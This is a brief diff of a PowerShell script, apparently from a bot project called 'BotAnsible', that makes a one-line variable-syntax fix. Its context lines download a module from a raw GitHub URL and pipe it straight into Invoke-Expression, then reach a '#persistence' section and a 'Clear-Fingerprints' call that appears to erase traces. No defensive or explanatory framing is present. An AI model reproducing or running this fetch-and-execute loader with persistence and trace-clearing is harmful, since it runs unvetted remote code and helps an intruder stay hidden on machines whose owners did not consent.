@@ -16,7 +16,7 @@ $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Direcció
 $ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
 (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex
 $commandlist=@('account_ansible')
-$GLOBAL:$joblist=@{}
+$GLOBAL:joblist=@{}
 #if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
 Clear-Fingerprints
